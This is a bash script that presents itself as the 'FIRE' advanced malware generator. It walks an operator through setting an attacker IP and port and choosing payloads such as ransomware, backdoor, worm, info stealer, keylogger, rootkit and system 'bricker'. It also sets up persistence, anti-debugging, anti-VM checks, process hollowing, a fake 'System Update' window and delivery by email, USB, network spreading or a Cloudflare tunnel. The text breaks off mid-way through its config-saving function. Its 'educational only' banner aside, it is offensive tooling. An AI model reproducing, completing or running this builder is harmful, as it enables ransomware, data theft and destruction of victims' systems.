#!/bin/bash

# FIRE Educational Framework - Educational Version Only
# WARNING: This tool is for educational purposes only
# Unauthorized use is illegal and unethical

# Color codes
R='\033[1;31m'
G='\033[1;32m'
Y='\033[1;33m'
B='\033[1;34m'
NC='\033[0m'
BOLD='\033[1m'

# Configuration
DEFAULT_ATTACKER_IP="127.0.0.1"
DEFAULT_ATTACKER_PORT="4444"
VENV_DIR="./fire_venv"
WORK_DIR="./fire_build"
FINAL_NAME_WIN="pc.exe"
FINAL_NAME_LIN="pc"
LOG_FILE="fire_generator.log"
MAX_LOG_SIZE=1048576
CONFIG_FILE=".fire_config"
TEMP_DIR="/tmp/fire_temp_$$"
DELIVERY_DIR="./fire_delivery"
CLOUDFLARED_DIR="./cloudflared"

# Advanced configuration options
declare -A ENCRYPTION_ALGORITHMS=(
    ["1"]="AES-256-GCM"
    ["2"]="ChaCha20-Poly1305"
    ["3"]="Blowfish-CBC"
    ["4"]="Serpent-256-CBC"
    ["5"]="Twofish-CBC"
)
declare -A PERSISTENCE_METHODS=(
    ["1"]="registry"
    ["2"]="cron"
    ["3"]="launchd"
    ["4"]="systemd"
    ["5"]="startup_folder"
    ["6"]="wmi_subscription"
    ["7"]="windows_startup"  # New: Windows Startup folder
    ["8"]="macos_launchagent"  # New: macOS LaunchAgent
    ["9"]="linux_systemd"  # New: Linux systemd
)
declare -A OBFUSCATION_TECHNIQUES=(
    ["1"]="basic"
    ["2"]="intermediate"
    ["3"]="advanced"
    ["4"]="professional"
    ["5"]="military_grade"
)
declare -A PACKING_METHODS=(
    ["1"]="upx"
    ["2"]="mpress"
    ["3"]="custom"
    ["4"]="none"
)
declare -A DELIVERY_METHODS=(
    ["1"]="email"
    ["2"]="usb"
    ["3"]="web"
    ["4"]="network"
    ["5"]="social_engineering"
    ["6"]="bundle"
    ["7"]="cloudflare_tunnel"
)

# Global variables
SCRIPT_VERSION="7.9-Cloudflare-HTTPS-Fixed-CrossPlatform-AutoExec-FakeGUI-FixedIndent-Enhanced-v2"
BUILD_TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
BUILD_ID=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 8)

# Configuration variables
ATTACKER_IP=""
ATTACKER_PORT=""
TARGET_OS=""
FINAL_NAME=""
PAYLOAD_TYPE=""
ENCRYPTION_ALGORITHM="AES-256-GCM"
OBFUSCATION_LEVEL=3
PERSISTENCE_METHOD="windows_startup"  # Changed default to Windows startup folder
ANTI_DEBUG_ENABLED=true
ANTI_VM_ENABLED=true
PACKER_ENABLED=true
PACKING_METHOD="upx"
SHELLCODE_INJECTION=true
PROCESS_HOLLOWING=true
RUNTIME_DECRYPTION=true
KEEP_BUILD_FILES="false"
DELIVERY_METHOD=""
DELIVERY_TARGETS=""
CLOUDFLARE_TUNNEL_ENABLED=false
CLOUDFLARE_TUNNEL_URL=""
CLOUDFLARE_TUNNEL_PORT="8080"
AUTO_EXECUTION=true  
FAKE_GUI_ENABLED=true # New: Enables a fake "System Update" window

# Logging system
init_logging() {
    [ ! -f "$LOG_FILE" ] && touch "$LOG_FILE"
    
    if [ -f "$LOG_FILE" ] && [ $(stat -f%z "$LOG_FILE" 2>/dev/null || stat -c%s "$LOG_FILE") -gt $MAX_LOG_SIZE ]; then
        mv "$LOG_FILE" "${LOG_FILE}.$(date +%Y%m%d_%H%M%S)"
        gzip "${LOG_FILE}.$(date +%Y%m%d_%H%M%S)" &
    fi
}

log_message() {
    local level=$1
    local message=$2
    local timestamp=$(date +"%Y-%m-%d %T")
    local log_entry="[$timestamp] [$level] $message"
    
    echo "$log_entry" >> "$LOG_FILE"
    
    case $level in
        "CRITICAL") echo -e "${R}[CRITICAL]${NC} ${BOLD}$message${NC}" ;;
        "ERROR") echo -e "${R}[ERROR]${NC} ${BOLD}$message${NC}" ;;
        "WARNING") echo -e "${Y}[WARNING]${NC} $message${NC}" ;;
        "INFO") echo -e "${G}[INFO]${NC} $message${NC}" ;;
        "DEBUG") echo -e "${B}[DEBUG]${NC} $message${NC}" ;;
        "SUCCESS") echo -e "${G}[SUCCESS]${NC} ${BOLD}$message${NC}" ;;
        *) echo "[$level] $message" ;;
    esac
}

# Validation functions
validate_ip() {
    local ip="$1"
    
    [[ ! $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]] && return 1
    
    IFS='.' read -ra ADDR <<< "$ip"
    for i in "${ADDR[@]}"; do
        [[ $i -gt 255 ]] || [[ $i -lt 0 ]] && return 1
    done
    
    [[ "$ip" == "0.0.0.0" ]] || [[ "$ip" == "255.255.255.255" ]] && return 1
    
    local first_octet=${ADDR[0]}
    local second_octet=${ADDR[1]}
    
    if [ "$first_octet" == "10" ] || 
       ([ "$first_octet" == "172" ] && [ "$second_octet" -ge 16 ] && [ "$second_octet" -le 31 ]) ||
       ([ "$first_octet" == "192" ] && [ "$second_octet" == "168" ]); then
        echo -e "${Y}[!] Warning: Using private IP address (${ip})${NC}"
    fi
    
    return 0
}

validate_port() {
    local port="$1"
    
    [[ ! $port =~ ^[0-9]+$ ]] || [ "$port" -lt 1 ] || [ "$port" -gt 65535 ] && return 1
    
    local reserved_ports=(20 21 22 23 25 53 80 110 143 443 993 995 1433 3306 3389 5432 5900)
    local service_names=("FTP" "SSH" "Telnet" "SMTP" "DNS" "HTTP" "POP3" "IMAP" "HTTPS" "IMAPS" "POP3S" "MSSQL" "MySQL" "RDP" "PostgreSQL" "VNC")
    
    for i in "${!reserved_ports[@]}"; do
        if [ "$port" -eq "${reserved_ports[$i]}" ]; then
            echo -e "${Y}[!] Warning: Port $port is commonly used for ${service_names[$i]}${NC}"
            break
        fi
    done
    
    return 0
}

# Banner display
display_banner() {
    clear
    
    local os_info=$(uname -s)
    local kernel_info=$(uname -r)
    local arch_info=$(uname -m)
    local cpu_info=$(grep 'model name' /proc/cpuinfo | head -1 | cut -d':' -f2 | xargs 2>/dev/null || echo "Unknown")
    local mem_info=$(free -h | grep '^Mem:' | awk '{print $2}' 2>/dev/null || echo "Unknown")
    local disk_info=$(df -h / | tail -1 | awk '{print $4}' 2>/dev/null || echo "Unknown")
    
    printf '%s\n' "╔══════════════════════════════════════════════════════════╗"
    printf '%s\n' "║  __      __  _    _  _        _____            _   _          ║"
    printf '%s\n' "║  \ \    / / | |  | || |      / ____|    /\    | \ | |         ║"
    printf '%s\n' "║   \ \  / /  | |  | || |     | |        /  \   |  \| |         ║"
    printf '%s\n' "║    \ \/ /   | |  | || |     | |       / /\ \  | . \` |         ║"
    printf '%s\n' "║     \  /    | |__| || |____ | |____  / ____ \ | |\  |         ║"
    printf '%s\n' "║      \/      \____/ |______| \_____|/_/    \_\|_| \_|         ║"
    printf '%s\n' "║                                                              ║"
    printf '%s\n' "║    [ FIRE // Advanced Malware Generator v$SCRIPT_VERSION ]       ║"
    printf '%s\n' "║                                                              ║"
    printf '%s\n' "║    [ Build ID: $BUILD_ID | Timestamp: $BUILD_TIMESTAMP ]      ║"
    printf '%s\n' "╚══════════════════════════════════════════════════════════╝"
    
    echo -e "\n${B}SYSTEM INFORMATION:${NC}"
    echo -e "${Y}OS:${NC} $os_info $kernel_info"
    echo -e "${Y}Architecture:${NC} $arch_info"
    echo -e "${Y}CPU:${NC} $cpu_info"
    echo -e "${Y}Memory:${NC} $mem_info"
    echo -e "${Y}Free Disk:${NC} $disk_info"
    echo -e "${Y}Build ID:${NC} $BUILD_ID"
    echo -e "${Y}Timestamp:${NC} $BUILD_TIMESTAMP"
    
    echo -e "\n${R}WARNING: This tool is for educational purposes only.${NC}"
    echo -e "${R}Unauthorized use is illegal and unethical.${NC}\n"
}

# Environment setup
check_dependencies() {
    log_message "INFO" "Checking dependencies..."
    
    local missing_deps=()
    local outdated_deps=()
    local optional_deps=()
    
    if ! command -v python3 &> /dev/null; then
        missing_deps+=("python3")
    else
        local python_version=$(python3 --version 2>&1 | cut -d' ' -f2)
        local python_major=$(echo $python_version | cut -d'.' -f1)
        local python_minor=$(echo $python_version | cut -d'.' -f2)
        
        if [ "$python_major" -lt 3 ] || ([ "$python_major" -eq 3 ] && [ "$python_minor" -lt 7 ]); then
            outdated_deps+=("python3 (version >= 3.7 required, found $python_version)")
        else
            log_message "DEBUG" "Python version OK: $python_version"
        fi
    fi
    
    if ! command -v pip &> /dev/null && ! command -v pip3 &> /dev/null; then
        missing_deps+=("pip")
    else
        local pip_version=$(pip --version 2>/dev/null | cut -d' ' -f2 || pip3 --version 2>/dev/null | cut -d' ' -f2)
        log_message "DEBUG" "Pip version: $pip_version"
    fi
    
    if ! command -v git &> /dev/null; then
        optional_deps+=("git (recommended for version control)")
    fi
    
    if ! command -v upx &> /dev/null; then
        optional_deps+=("upx (recommended for executable compression)")
    fi
    
    if ! command -v sendmail &> /dev/null; then
        optional_deps+=("sendmail (for email delivery)")
    fi
    
    if ! command -v wget &> /dev/null && ! command -v curl &> /dev/null; then
        optional_deps+=("wget or curl (for downloading cloudflared)")
    fi
    
    if [ ${#missing_deps[@]} -ne 0 ] || [ ${#outdated_deps[@]} -ne 0 ]; then
        echo -e "${R}[!] Critical dependencies missing or outdated:${NC}"
        
        for dep in "${missing_deps[@]}"; do
            echo -e "${R}    Missing: $dep${NC}"
        done
        
        for dep in "${outdated_deps[@]}"; do
            echo -e "${Y}    Outdated: $dep${NC}"
        done
        
        echo -e "${Y}[*] Please install/update missing dependencies and try again.${NC}"
        log_message "ERROR" "Missing/outdated dependencies: ${missing_deps[*]} ${outdated_deps[*]}"
        exit 1
    fi
    
    if [ ${#optional_deps[@]} -ne 0 ]; then
        echo -e "${Y}[!] Optional dependencies not found (not critical):${NC}"
        for dep in "${optional_deps[@]}"; do
            echo -e "${Y}    $dep${NC}"
        done
    fi
    
    log_message "SUCCESS" "All critical dependencies are installed and up to date"
}

setup_cloudflared() {
    log_message "INFO" "Setting up Cloudflare tunnel..."
    
    mkdir -p "$CLOUDFLARED_DIR"
    
    local cloudflared_binary="$CLOUDFLARED_DIR/cloudflared"
    local arch=$(uname -m)
    local os=$(uname -s | tr '[:upper:]' '[:lower:]')
    
    # Determine correct binary for architecture
    case "$arch" in
        x86_64) arch="amd64" ;;
        aarch64|arm64) arch="arm64" ;;
        armv7l) arch="arm" ;;
        *) arch="amd64" ;;
    esac
    
    # Determine correct binary for OS
    case "$os" in
        linux) os="linux" ;;
        darwin) os="darwin" ;;
        *) os="linux" ;;
    esac
    
    local cloudflared_url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-${os}-${arch}"
    
    # Download cloudflared if not present or if it's corrupted
    if [ ! -f "$cloudflared_binary" ] || [ ! -x "$cloudflared_binary" ]; then
        echo -e "${Y}[*] Downloading cloudflared...${NC}"
        
        # Remove any existing corrupted binary
        [ -f "$cloudflared_binary" ] && rm -f "$cloudflared_binary"
        
        if command -v wget &> /dev/null; then
            wget -q "$cloudflared_url" -O "$cloudflared_binary"
        elif command -v curl &> /dev/null; then
            curl -sL "$cloudflared_url" -o "$cloudflared_binary"
        else
            log_message "ERROR" "Neither wget nor curl is available to download cloudflared"
            return 1
        fi
        
        if [ $? -ne 0 ]; then
            log_message "ERROR" "Failed to download cloudflared"
            return 1
        fi
        
        # Make sure the binary is executable
        chmod +x "$cloudflared_binary"
        log_message "SUCCESS" "cloudflared downloaded successfully"
    else
        log_message "INFO" "cloudflared already exists"
    fi
    
    # Verify cloudflared is working with multiple methods
    local working=false
    
    # Method 1: Try to get version
    if "$cloudflared_binary" --version &> /dev/null; then
        local version=$("$cloudflared_binary" --version 2>&1 | head -1)
        log_message "INFO" "cloudflared version: $version"
        working=true
    else
        log_message "DEBUG" "Version check failed, trying alternative verification"
    fi
    
    # Method 2: Try help command if version failed
    if [ "$working" = false ]; then
        if "$cloudflared_binary" --help &> /dev/null; then
            log_message "INFO" "cloudflared binary is working (help command succeeded)"
            working=true
        else
            log_message "DEBUG" "Help command failed, trying file verification"
        fi
    fi
    
    # Method 3: Check file type and permissions
    if [ "$working" = false ]; then
        if file "$cloudflared_binary" | grep -q "executable"; then
            log_message "INFO" "cloudflared binary appears to be a valid executable"
            working=true
        else
            log_message "ERROR" "cloudflared binary is not recognized as an executable"
            log_message "DEBUG" "File type: $(file "$cloudflared_binary")"
        fi
    fi
    
    if [ "$working" = false ]; then
        log_message "ERROR" "cloudflared binary is not working"
        return 1
    fi
    
    return 0
}

start_cloudflare_tunnel() {
    local local_port=$1
    local tunnel_dir=$2
    
    log_message "INFO" "Starting Cloudflare tunnel on port $local_port..."
    
    # Start cloudflared tunnel in background
    local tunnel_log="$TEMP_DIR/tunnel.log"
    local cloudflared_binary="$CLOUDFLARED_DIR/cloudflared"
    
    # Kill any existing cloudflared processes
    pkill -f cloudflared 2>/dev/null || true
    
    # Try to start a temporary tunnel without authentication
    "$cloudflared_binary" tunnel --url "http://localhost:$local_port" --logfile "$tunnel_log" &
    local tunnel_pid=$!
    
    # Save the PID immediately
    echo "$tunnel_pid" > "$TEMP_DIR/tunnel.pid"
    
    # Wait for tunnel to initialize
    echo -e "${Y}[*] Waiting for tunnel to initialize...${NC}"
    sleep 10
    
    # Extract tunnel URL from log with improved pattern matching
    local tunnel_url=""
    
    # Method 1: Try to extract from log file
    if [ -f "$tunnel_log" ]; then
        tunnel_url=$(grep -o 'https://[^[:space:]]*\.trycloudflare\.com' "$tunnel_log" | head -1)
        if [ -n "$tunnel_url" ]; then
            log_message "DEBUG" "Found tunnel URL in log file: $tunnel_url"
        fi
    fi
    
    # Method 2: Try to get URL from process output
    if [ -z "$tunnel_url" ]; then
        sleep 5
        tunnel_url=$(ps aux | grep cloudflared | grep -o 'https://[^[:space:]]*\.trycloudflare\.com' | head -1)
        if [ -n "$tunnel_url" ]; then
            log_message "DEBUG" "Found tunnel URL in process output: $tunnel_url"
        fi
    fi
    
    # Method 3: Try to extract from the log with more patterns
    if [ -z "$tunnel_url" ] && [ -f "$tunnel_log" ]; then
        sleep 2
        tunnel_url=$(grep -o 'https://[^[:space:]]*' "$tunnel_log" | grep trycloudflare | head -1)
        if [ -n "$tunnel_url" ]; then
            log_message "DEBUG" "Found tunnel URL with alternative pattern: $tunnel_url"
        fi
    fi
    
    # Method 4: Try to extract from the log with even more patterns
    if [ -z "$tunnel_url" ] && [ -f "$tunnel_log" ]; then
        tunnel_url=$(grep -o 'https://[^\"]*' "$tunnel_log" | head -1)
        if [ -n "$tunnel_url" ]; then
            log_message "DEBUG" "Found tunnel URL with generic pattern: $tunnel_url"
        fi
    fi
    
    # Method 5: Last resort - check if tunnel is working by making a request
    if [ -z "$tunnel_url" ]; then
        log_message "DEBUG" "Could not extract URL from logs, checking if tunnel is working..."
        
        # Wait a bit more for the tunnel to fully initialize
        sleep 10
        
        # Check if the tunnel is working by checking the log for success messages
        if grep -q "INF.*tunnel.*started" "$tunnel_log" 2>/dev/null; then
            log_message "DEBUG" "Tunnel appears to be running, but URL not found in logs"
            
            # Try to get the URL from the cloudflared API
            tunnel_url=$(curl -s http://localhost:43382/metrics 2>/dev/null | grep -o 'https://[^[:space:]]*\.trycloudflare\.com' | head -1)
            
            if [ -z "$tunnel_url" ]; then
                log_message "ERROR" "Could not determine tunnel URL"
                return 1
            fi
        else
            log_message "ERROR" "Tunnel does not appear to be running"
            log_message "DEBUG" "Last few lines of tunnel log:"
            tail -10 "$tunnel_log" 2>/dev/null || log_message "DEBUG" "Could not read tunnel log"
            return 1
        fi
    fi
    
    if [ -n "$tunnel_url" ]; then
        CLOUDFLARE_TUNNEL_URL="$tunnel_url"
        log_message "SUCCESS" "Cloudflare tunnel started: $CLOUDFLARE_TUNNEL_URL"
        return 0
    else
        log_message "ERROR" "Failed to start Cloudflare tunnel"
        return 1
    fi
}

stop_cloudflare_tunnel() {
    if [ -f "$TEMP_DIR/tunnel.pid" ]; then
        local tunnel_pid=$(cat "$TEMP_DIR/tunnel.pid")
        if kill -0 "$tunnel_pid" 2>/dev/null; then
            kill "$tunnel_pid"
            log_message "INFO" "Cloudflare tunnel stopped"
        fi
        rm -f "$TEMP_DIR/tunnel.pid"
    fi
    
    # Kill any remaining cloudflared processes
    pkill -f cloudflared 2>/dev/null || true
}

setup_environment() {
    log_message "INFO" "Setting up environment..."
    
    mkdir -p "$TEMP_DIR"
    mkdir -p "$DELIVERY_DIR"
    
    if [ ! -d "$VENV_DIR" ]; then
        echo -e "${Y}[*] Creating isolated Python environment...${NC}"
        if ! python3 -m venv "$VENV_DIR" --system-site-packages; then
            log_message "ERROR" "Failed to create virtual environment"
            exit 1
        fi
        log_message "SUCCESS" "Virtual environment created"
    else
        log_message "INFO" "Using existing virtual environment"
    fi
    
    if ! source "$VENV_DIR/bin/activate"; then
        log_message "ERROR" "Failed to activate virtual environment"
        exit 1
    fi
    
    echo -e "${Y}[*] Upgrading pip and setuptools...${NC}"
    if ! pip install --quiet --upgrade pip setuptools wheel; then
        log_message "WARNING" "Failed to upgrade pip/setuptools"
    fi
    
    local required_packages=("pyinstaller" "cryptography" "requests" "psutil" "pefile" "yara-python" "flask")
    
    for package in "${required_packages[@]}"; do
        if ! python3 -c "import ${package//-/_}" &> /dev/null; then
            echo -e "${Y}[*] Installing $package...${NC}"
            if ! pip install --quiet "$package"; then
                log_message "ERROR" "Failed to install $package"
                exit 1
            fi
            log_message "SUCCESS" "$package installed"
        else
            log_message "DEBUG" "$package already installed"
        fi
    done
    
    mkdir -p "$WORK_DIR"
    if ! cd "$WORK_DIR"; then
        log_message "ERROR" "Failed to create/access work directory"
        exit 1
    fi
    
    pip freeze > requirements.txt
    log_message "INFO" "Requirements saved to requirements.txt"
    
    log_message "SUCCESS" "Environment setup complete"
}

# Configuration management
get_configuration() {
    echo -e "${B}CONFIGURATION:${NC}"
    
    while true; do
        read -p "Enter attacker IP address [default: $DEFAULT_ATTACKER_IP]: " ATTACKER_IP
        ATTACKER_IP=${ATTACKER_IP:-$DEFAULT_ATTACKER_IP}
        
        if validate_ip "$ATTACKER_IP" || [ "$ATTACKER_IP" == "$DEFAULT_ATTACKER_IP" ]; then
            log_message "INFO" "Using attacker IP: $ATTACKER_IP"
            break
        else
            echo -e "${R}[!] Invalid IP address format. Please try again.${NC}"
        fi
    done

    while true; do
        read -p "Enter attacker port [default: $DEFAULT_ATTACKER_PORT]: " ATTACKER_PORT
        ATTACKER_PORT=${ATTACKER_PORT:-$DEFAULT_ATTACKER_PORT}
        
        if validate_port "$ATTACKER_PORT" || [ "$ATTACKER_PORT" == "$DEFAULT_ATTACKER_PORT" ]; then
            log_message "INFO" "Using attacker port: $ATTACKER_PORT"
            break
        else
            echo -e "${R}[!] Invalid port number. Please enter a value between 1-65535.${NC}"
        fi
    done

    read -p "Configure advanced options? [y/N]: " adv_config
    if [[ "$adv_config" =~ ^[Yy]$ ]]; then
        advanced_config
    fi

    echo -e "\n${B}SELECT TARGET OPERATING SYSTEM:${NC}"
    echo "1) Windows"
    echo "2) Linux"
    echo "3) macOS"
    echo "4) Cross-platform"
    while true; do
        read -p ">> " os_choice
        case $os_choice in
            1)
                TARGET_OS="Windows"
                FINAL_NAME="$FINAL_NAME_WIN"
                log_message "INFO" "Target OS selected: Windows"
                break
                ;;
            2)
                TARGET_OS="Linux"
                FINAL_NAME="$FINAL_NAME_LIN"
                log_message "INFO" "Target OS selected: Linux"
                break
                ;;
            3)
                TARGET_OS="macOS"
                FINAL_NAME="$FINAL_NAME_LIN"
                log_message "INFO" "Target OS selected: macOS"
                break
                ;;
            4)
                TARGET_OS="Cross-platform"
                FINAL_NAME="$FINAL_NAME_LIN"
                log_message "INFO" "Target OS selected: Cross-platform"
                break
                ;;
            *)
                echo -e "${R}[!] Invalid OS choice. Please enter 1-4.${NC}"
                ;;
        esac
    done

    echo -e "\n${B}SELECT PAYLOAD TYPE:${NC}"
    echo "1) Bricker (System Destroyer)"
    echo "2) Backdoor (Remote Access)"
    echo "3) Ransomware (File Encryptor)"
    echo "4) Worm (Network Spreader)"
    echo "5) Info Stealer (Data Exfiltration)"
    echo "6) Network Destroyer (DDoS Tool)"
    echo "7) Keylogger (Input Capture)"
    echo "8) Rootkit (System Stealth)"
    echo "9) Custom Payload Template"
    while true; do
        read -p ">> " payload_choice
        if [[ "$payload_choice" =~ ^[1-9]$ ]]; then
            PAYLOAD_TYPE="$payload_choice"
            log_message "INFO" "Payload type selected: $payload_choice"
            break
        else
            echo -e "${R}[!] Invalid payload type. Please enter a number between 1-9.${NC}"
        fi
    done

    read -p "Enter custom filename (leave empty for default): " CUSTOM_NAME
    if [ -n "$CUSTOM_NAME" ]; then
        if [ "$TARGET_OS" == "Windows" ] && [[ ! "$CUSTOM_NAME" =~ \.exe$ ]]; then
            CUSTOM_NAME="${CUSTOM_NAME}.exe"
        fi
        FINAL_NAME="$CUSTOM_NAME"
        log_message "INFO" "Using custom filename: $FINAL_NAME"
    fi

    # Auto-execution configuration
    echo -e "\n${B}AUTO-EXECUTION CONFIGURATION:${NC}"
    read -p "Enable auto-execution on installation? [Y/n]: " auto_exec
    AUTO_EXECUTION=true
    if [[ "$auto_exec" =~ ^[Nn]$ ]]; then
        AUTO_EXECUTION=false
    fi
    
    if [ "$AUTO_EXECUTION" = true ]; then
        echo -e "${Y}[*] Auto-execution will be enabled for this payload.${NC}"
        log_message "INFO" "Auto-execution enabled"
        
        # Enhanced persistence method selection based on OS
        echo -e "\n${B}SELECT PERSISTENCE METHOD:${NC}"
        if [ "$TARGET_OS" == "Windows" ] || [ "$TARGET_OS" == "Cross-platform" ]; then
            echo "1) Windows Registry (HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run)"
            echo "2) Windows Startup Folder (C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp)"
            echo "3) WMI Event Subscription"
            echo "4) Scheduled Task"
        elif [ "$TARGET_OS" == "Linux" ] || [ "$TARGET_OS" == "Cross-platform" ]; then
            echo "5) Cron Job"
            echo "6) Systemd Service (/lib/systemd/system/)"
            echo "7) Init.d Script"
            echo "8) Profile Modification"
        elif [ "$TARGET_OS" == "macOS" ] || [ "$TARGET_OS" == "Cross-platform" ]; then
            echo "9) LaunchAgent (/Library/LaunchAgents/)"
            echo "10) LaunchDaemon (/Library/LaunchDaemons/)"
            echo "11) Login Item"
            echo "12) Cron Job"
        fi
        
        while true; do
            read -p ">> " pers_choice
            if [ "$TARGET_OS" == "Windows" ] || [ "$TARGET_OS" == "Cross-platform" ]; then
                case $pers_choice in
                    1) PERSISTENCE_METHOD="registry"; break ;;
                    2) PERSISTENCE_METHOD="windows_startup"; break ;;
                    3) PERSISTENCE_METHOD="wmi_subscription"; break ;;
                    4) PERSISTENCE_METHOD="scheduled_task"; break ;;
                    *) echo -e "${R}[!] Invalid choice. Please enter 1-4.${NC}" ;;
                esac
            elif [ "$TARGET_OS" == "Linux" ] || [ "$TARGET_OS" == "Cross-platform" ]; then
                case $pers_choice in
                    5) PERSISTENCE_METHOD="cron"; break ;;
                    6) PERSISTENCE_METHOD="linux_systemd"; break ;;
                    7) PERSISTENCE_METHOD="init_script"; break ;;
                    8) PERSISTENCE_METHOD="profile_mod"; break ;;
                    *) echo -e "${R}[!] Invalid choice. Please enter 5-8.${NC}" ;;
                esac
            elif [ "$TARGET_OS" == "macOS" ] || [ "$TARGET_OS" == "Cross-platform" ]; then
                case $pers_choice in
                    9) PERSISTENCE_METHOD="macos_launchagent"; break ;;
                    10) PERSISTENCE_METHOD="macos_launchdaemon"; break ;;
                    11) PERSISTENCE_METHOD="login_item"; break ;;
                    12) PERSISTENCE_METHOD="cron"; break ;;
                    *) echo -e "${R}[!] Invalid choice. Please enter 9-12.${NC}" ;;
                esac
            fi
        done
        
        log_message "INFO" "Persistence method selected: $PERSISTENCE_METHOD"
    else
        echo -e "${Y}[*] Auto-execution will be disabled for this payload.${NC}"
        log_message "INFO" "Auto-execution disabled"
    fi

    # Fake GUI configuration
    echo -e "\n${B}APPEARANCE CONFIGURATION:${NC}"
    read -p "Enable Fake GUI (Social Engineering)? [Y/n]: " fake_gui
    FAKE_GUI_ENABLED=true
    if [[ "$fake_gui" =~ ^[Nn]$ ]]; then
        FAKE_GUI_ENABLED=false
    fi
    
    if [ "$FAKE_GUI_ENABLED" = true ]; then
        echo -e "${Y}[*] Payload will show a fake 'System Update' window to hide execution.${NC}"
        log_message "INFO" "Fake GUI enabled"
    else
        echo -e "${Y}[*] Payload will run silently (no window).${NC}"
        log_message "INFO" "Fake GUI disabled"
    fi

    read -p "Keep build files for debugging? [y/N]: " KEEP_BUILD_FILES
    KEEP_BUILD_FILES=${KEEP_BUILD_FILES:-"false"}
    if [[ "$KEEP_BUILD_FILES" =~ ^[Yy]$ ]]; then
        KEEP_BUILD_FILES="true"
        log_message "INFO" "User chose to keep build files"
    else
        KEEP_BUILD_FILES="false"
        log_message "INFO" "User chose not to keep build files"
    fi

    # Delivery configuration
    echo -e "\n${B}DELIVERY CONFIGURATION:${NC}"
    echo "1) Email Delivery"
    echo "2) USB Drive Preparation"
    echo "3) Web Server Hosting"
    echo "4) Network Distribution"
    echo "5) Social Engineering Kit"
    echo "6) Application Bundling"
    echo "7) Cloudflare Tunnel (Secure Remote Access)"
    echo "8) Skip Delivery (Generate Only)"
    
    while true; do
        read -p "Select delivery method: " delivery_choice
        if [[ "$delivery_choice" =~ ^[1-8]$ ]]; then
            if [ "$delivery_choice" -eq 8 ]; then
                DELIVERY_METHOD=""
                log_message "INFO" "Skipping delivery configuration"
                break
            else
                DELIVERY_METHOD="${DELIVERY_METHODS[$delivery_choice]}"
                log_message "INFO" "Delivery method selected: $DELIVERY_METHOD"
                break
            fi
        else
            echo -e "${R}[!] Invalid delivery method. Please enter a number between 1-8.${NC}"
        fi
    done

    if [ -n "$DELIVERY_METHOD" ]; then
        case "$DELIVERY_METHOD" in
            "email")
                read -p "Enter recipient email (comma-separated for multiple): " DELIVERY_TARGETS
                ;;
            "usb")
                read -p "Enter USB device path (e.g., /dev/sdb1): " DELIVERY_TARGETS
                ;;
            "web")
                read -p "Enter web server directory (e.g., /var/www/html): " DELIVERY_TARGETS
                ;;
            "network")
                read -p "Enter target network range (e.g., 192.168.1.0/24): " DELIVERY_TARGETS
                ;;
            "social_engineering")
                read -p "Enter social engineering template name: " DELIVERY_TARGETS
                ;;
            "bundle")
                read -p "Enter legitimate application to bundle with: " DELIVERY_TARGETS
                ;;
            "cloudflare_tunnel")
                read -p "Enter local port for tunnel [default: $CLOUDFLARE_TUNNEL_PORT]: " tunnel_port
                CLOUDFLARE_TUNNEL_PORT=${tunnel_port:-$CLOUDFLARE_TUNNEL_PORT}
                DELIVERY_TARGETS="$CLOUDFLARE_TUNNEL_PORT"
                CLOUDFLARE_TUNNEL_ENABLED=true
                ;;
        esac
        log_message "INFO" "Delivery targets: $DELIVERY_TARGETS"
    fi

    save_config
}

advanced_config() {
    echo -e "\n${B}ADVANCED CONFIGURATION:${NC}"
    
    echo -e "${Y}Select encryption algorithm:${NC}"
    for i in "${!ENCRYPTION_ALGORITHMS[@]}"; do
        echo "$i) ${ENCRYPTION_ALGORITHMS[$i]}"
    done
    read -p ">> " enc_choice
    ENCRYPTION_ALGORITHM="${ENCRYPTION_ALGORITHMS[$enc_choice]:-${ENCRYPTION_ALGORITHMS[1]}}"
    
    echo -e "\n${Y}Select obfuscation level:${NC}"
    for i in "${!OBFUSCATION_TECHNIQUES[@]}"; do
        echo "$i) ${OBFUSCATION_TECHNIQUES[$i]}"
    done
    read -p ">> " obs_choice
    OBFUSCATION_LEVEL=$obs_choice
    
    echo -e "\n${Y}Select packing method:${NC}"
    for i in "${!PACKING_METHODS[@]}"; do
        echo "$i) ${PACKING_METHODS[$i]}"
    done
    read -p ">> " pack_choice
    PACKING_METHOD="${PACKING_METHODS[$pack_choice]:-${PACKING_METHODS[1]}}"
    
    read -p "Enable anti-debugging? [Y/n]: " anti_debug
    ANTI_DEBUG_ENABLED=true
    if [[ "$anti_debug" =~ ^[Nn]$ ]]; then
        ANTI_DEBUG_ENABLED=false
    fi
    
    read -p "Enable anti-VM detection? [Y/n]: " anti_vm
    ANTI_VM_ENABLED=true
    if [[ "$anti_vm" =~ ^[Nn]$ ]]; then
        ANTI_VM_ENABLED=false
    fi
    
    read -p "Enable shellcode injection? [Y/n]: " shellcode
    SHELLCODE_INJECTION=true
    if [[ "$shellcode" =~ ^[Nn]$ ]]; then
        SHELLCODE_INJECTION=false
    fi
    
    read -p "Enable process hollowing? [Y/n]: " hollowing
    PROCESS_HOLLOWING=true
    if [[ "$hollowing" =~ ^[Nn]$ ]]; then
        PROCESS_HOLLOWING=false
    fi
    
    read -p "Enable runtime decryption? [Y/n]: " runtime_decrypt
    RUNTIME_DECRYPTION=true
    if [[ "$runtime_decrypt" =~ ^[Nn]$ ]]; then
        RUNTIME_DECRYPTION=false
    fi
    
    log_message "INFO" "Advanced configuration updated"
}

save_config() {
    cat > "$CONFIG_FILE" << EOF
ATTACKER_IP="$ATTACKER_IP"
ATTACKER_PORT="$ATTACKER_PORT"
TARGET_OS="$TARGET_OS"
FINAL_NAME="$FINAL_NAME"
PAYLOAD_TYPE="$PAYLOAD_TYPE"
ENCRYPTION_ALGORITHM="$ENCRYPTION_ALGORITHM"
OBFUSCATION_LEVEL=$OBFUSCATION_LEVEL
PERSISTENCE_METHOD="$PERSISTENCE_METHOD"
ANTI_DEBUG_ENABLED=$ANTI_DEBUG_ENABLED
ANTI_VM_ENABLED=$ANTI_VM_ENABLED
PACKER_ENABLED=$PACKER_ENABLED
PACKING_METHOD="$PACKING_METHOD"
SHELLCODE_INJECTION=$SHELLCODE_INJECTION
PROCESS_HOLLOWING=$PROCESS_HOLLOWING
RUNTIME_DECRYPTION=$RUNTIME_DECRYPTION
